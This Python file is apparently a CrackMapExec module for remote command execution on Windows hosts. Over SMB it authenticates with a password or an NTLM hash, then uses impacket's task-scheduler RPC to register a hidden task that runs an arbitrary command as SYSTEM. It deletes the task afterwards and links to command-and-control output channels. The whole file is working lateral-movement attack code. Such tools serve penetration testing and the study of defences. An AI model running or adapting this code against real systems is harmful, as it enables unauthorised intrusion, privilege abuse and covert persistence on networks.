import logging
import inspect
from gevent import sleep
from cme.protocols.smb.c2s import *
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from cme.helpers.misc import gen_random_string


class TSCH_EXEC(object):
    def __init__(self, connection, command, payload, target, username, password, domain, hashes=None, retOutput=True):
        self.connection = connection
        self.command = command
        self.payload = payload
        self.target = target
        self.username = username
        self.password = password
        self.domain = domain
        self.lmhash = ''
        self.nthash = ''
        self.outputBuffer = ''
        self.retOutput = retOutput
        self.aesKey = None
        self.doKerberos = False

        if hashes is not None:
            # This checks to see if we didn't provide the LM Hash
            if hashes.find(':') != -1:
                self.lmhash, self.nthash = hashes.split(':')
            else:
                self.nthash = hashes

        if self.password is None:
            self.password = ''

        stringbinding = r'ncacn_np:%s[\pipe\atsvc]' % self.target
        self.rpctransport = transport.DCERPCTransportFactory(stringbinding)

        if hasattr(self.rpctransport, 'setRemoteHost'):
            self.rpctransport.setRemoteHost(self.target)
        if hasattr(self.rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            self.rpctransport.set_credentials(self.username, self.password, self.domain, self.lmhash, self.nthash)
        #rpctransport.set_kerberos(self.doKerberos, self.kdcHost)

        # https://stackoverflow.com/questions/44352/iterate-over-subclasses-of-a-given-class-in-a-given-module
        for k, obj in inspect.getmembers(self):
            if hasattr(obj, "__bases__"):
                for cls in obj.__bases__:
                    if cls.__name__ == 'WMI':
                        logging.debug('Using WMI C2')
                        WMI.__init__(self)

                    elif cls.__name__ == 'Registry':
                        logging.debug('Using Registry C2')
                        Registry.__init__(self, self.connection)

                    elif cls.__name__ == 'ADProperty':
                        logging.debug('Using ADProperty C2')
                        ADProperty.__init__(self)

    def execute_command(self, command):
        dce = self.rpctransport.get_dce_rpc()

        dce.set_credentials(*self.rpctransport.get_credentials())
        dce.connect()
        #dce.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        dce.bind(tsch.MSRPC_UUID_TSCHS)
        tmpName = gen_random_string(8)

        xml = self.gen_xml(command)

        while True:
            try:
                logging.info('Creating task \\%s' % tmpName)
                tsch.hSchRpcRegisterTask(dce, '\\%s' % tmpName, xml, tsch.TASK_CREATE, NULL, tsch.TASK_LOGON_NONE)
                break
            except:
                sleep(5)

        logging.info('Running task \\%s' % tmpName)
        tsch.hSchRpcRun(dce, '\\%s' % tmpName)

        while True:
            logging.debug('Calling SchRpcGetLastRunInfo for \\%s' % tmpName)
            resp = tsch.hSchRpcGetLastRunInfo(dce, '\\%s' % tmpName)
            if resp['pLastRuntime']['wYear'] != 0:
                break
            else:
                sleep(2)

        logging.info('Deleting task \\%s' % tmpName)
        tsch.hSchRpcDelete(dce, '\\%s' % tmpName)

        dce.disconnect()

    def gen_xml(self, command):

        xml = """<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2015-07-15T20:35:13.2757294</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="LocalSystem">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="LocalSystem">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/C {}</Arguments>
    </Exec>
  </Actions>
</Task>
""".format(command)
        logging.debug('Task XML:\n {} \n'.format(xml))
        return xml
